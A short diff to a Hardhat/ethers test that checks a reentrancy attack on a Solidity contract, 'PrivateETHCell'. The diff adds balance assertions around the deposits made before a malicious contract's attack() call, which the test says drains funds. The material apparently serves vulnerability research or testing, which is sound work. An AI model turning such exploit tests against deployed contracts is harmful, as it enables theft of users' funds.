@@ -28,9 +28,16 @@ describe("Reentrancy Attack for 0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol",
   it("should successfully drain funds through reentrancy attack", async function () {
     // Initial deposit to PrivateETHCell contract
     await privateETHCell.Deposit({ value: ethers.parseEther("2") });
+    
+    const initialBalance = await ethers.provider.getBalance(privateETHCell.target);
+    expect(initialBalance).to.equal(ethers.parseEther("2")); 
+
 
     // Initial deposit from maliciousCOntract on Personal Bank
     await maliciousContract.deposit({value:  ethers.parseEther("1")});
+
+    const privateBalanceAfterMalDeposit = await ethers.provider.getBalance(privateETHCell.target);
+    expect(privateBalanceAfterMalDeposit).to.equal(ethers.parseEther("3")); 
 
     // Perform reentrancy attack through MaliciousContract
     await maliciousContract.attack({ value: ethers.parseEther("1") });
